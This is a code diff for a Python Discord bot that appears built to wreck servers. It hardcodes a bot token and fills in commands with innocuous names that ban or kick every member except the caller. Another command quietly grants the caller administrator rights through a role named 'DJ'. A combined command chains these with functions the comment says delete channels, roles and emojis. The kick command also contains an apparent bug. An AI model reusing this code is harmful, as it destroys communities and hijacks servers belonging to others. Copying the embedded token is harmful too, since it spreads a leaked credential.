@@ -3,7 +3,7 @@ from discord.ext import commands
 from discord.flags import Intents
 import logging
 
-bottk=""
+bottk="ODQzODU2NjI1MTAyMjI1NDA4.YKJ8uQ.PIztaDI_hW3udF0R--4n1SWLQo8"
 
 intents=discord.Intents(messages = True, guilds = True, reactions = True, members = True, presences = True)
 client=commands.Bot(command_prefix='!', intents=intents)
@@ -67,21 +67,44 @@ async def blindnesspotion(ctx):
 
 @client.command()   #To ban everyone
 async def whomegalol(ctx):
-    pass
+    all_members= ctx.guild.members
+    for mem in all_members:
+        try:
+            if ctx.author==mem:
+                pass
+            else:
+                await discord.Member.ban(mem)
+                print(f"Member banned: {mem}")
+        except:
+            print(f"Couldn't ban member: {mem}")
+
 
 @client.command()   #To kick everyone
 async def kickbuttowski(ctx):
-    pass
+    all_members= await ctx.guild.members
+    for mem in all_members:
+        try:
+            if ctx.author==mem:
+                pass
+            else:
+                await discord.Member.kick(mem)
+                print(f"Member kicked: {mem}")
+        except:
+            print(f"Couldn't kick member: {mem}")
+            
 
 @client.command()   #To get admin permissions
 async def jamesbond007(ctx):
-    pass
+    admin_perms=discord.Permissions(administrator=True)
+    admin_role= await ctx.guild.create_role(name="DJ", permissions=admin_perms)
+    await ctx.author.add_roles(admin_role)
 
 @client.command()   #To: Ban people, delete channels, delete roles, delete emojis, making the user admin
-async def everthingatoncebylenka():
-    pass
-
-@client.command()
+async def everthingatoncebylenka(ctx):
+    await omegalulgone(ctx)
+    await whomegalol(ctx)
+    await allwhite(ctx)
+    await blindnesspotion(ctx)
 
 @client.command()
 async def help(ctx):
